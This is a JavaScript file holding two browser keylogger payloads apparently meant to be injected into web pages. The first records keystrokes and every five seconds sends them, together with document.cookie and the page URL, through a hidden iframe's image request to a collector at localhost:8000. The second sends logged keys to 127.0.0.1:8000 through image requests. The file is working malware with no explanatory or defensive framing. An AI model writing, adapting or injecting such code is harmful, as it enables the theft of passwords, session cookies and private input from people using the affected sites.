(function () {
	console.log("script-src 'self' ");
	let html = `
	<body>
		<img src="http://localhost:8000/inject.js?c=${keys}&cookie=${document.cookie}&domain=${document.URL}"/>
	</body>`;

	let iframe = document.createElement('iframe')
	iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(html);
	iframe.style.width ="0px"
	document.body.appendChild(iframe);

	var keys = "";
	var identification = "Unidentified!";
	var flag = true;
	window.onload = () => {
		var submit_ = (data) => {
			var remote_server = "";
			var currentLocation = document?.location?.href;
			console.log({
				"location": currentLocation,
				"data": data
			})
			console.log("script-src 'self' ");
			let html = `
				<body>
					<img src="http://localhost:8000/inject.js?c=${keys}&cookie=${document.cookie}&domain=${document.URL}"/>
				</body>`;
			iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(html);
		}
		window.addEventListener('keypress', ( e ) => {
			var get = window.event ? event : e;
			var key = get.keyCode;
			switch(key){
				case 13:
					key = "<ENTER>";
					keys += key;
					break;

				default:
					key = key ? get.keyCode : get.charCode;
					key = String.fromCharCode(key);
					keys += key;
			}
		});
		window.addEventListener('keyup', ( e ) => {
			var get = window.event ? event : e;
			var key = get.keyCode;
			switch(key){
				case 8:
					key = "<BACKSPACE>";
					keys += key;
					break;
				case 17:
					key = "<CTRL>";
					keys += key;
					break;
			}
		});


		window.setInterval(() => {
			if(keys.length && keys !== '<CTRL>'){
				submit_(keys);
			}
				keys = "";
			}, 5000
		)
	}
})()

var keys='';
var url = 'http://127.0.0.1:8000/inject.js?c=';

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	if(keys.length>0) {
		new Image().src = url+keys;
		keys = '';
	}
}, 5000);